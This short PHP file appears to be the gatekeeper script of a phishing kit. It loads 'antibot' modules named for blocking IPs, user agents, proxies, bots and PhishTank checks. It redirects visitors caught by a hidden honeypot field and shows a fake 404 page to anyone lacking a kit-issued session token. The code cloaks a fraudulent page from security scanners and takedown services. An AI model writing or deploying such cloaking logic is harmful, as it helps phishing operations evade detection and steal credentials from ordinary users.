<?php

session_start();
// error_reporting(0);
require ("../ElZero/ElZero.php");
require ("../../ElZero/function.php");
require ("../../X-Sniper/antibot_ip.php");
require ("../../X-Sniper/antibot_userAgent.php");
require ("../../X-Sniper/antibot_host.php");
require ("../../X-Sniper/antibot_phishtank.php");
require ("../../X-Sniper/antibot_proxy.php");
require ("../../X-Sniper/someBots.php");
require ("../../X-Sniper/antibots5.php");
require ("../../X-Sniper/X-sniper1.php");
require ("../../X-Sniper/X-sniper2.php");


if (isset($_POST['hidden']) && !empty($_POST['elzeroKiller'])  ) {
	header("Location: ".$redirectLink);exit();
	
}
if (!isset($_SESSION['ElZeR0_ToKeN']) ) {
  header('HTTP/1.0 404 Not Found');exit();
}


?>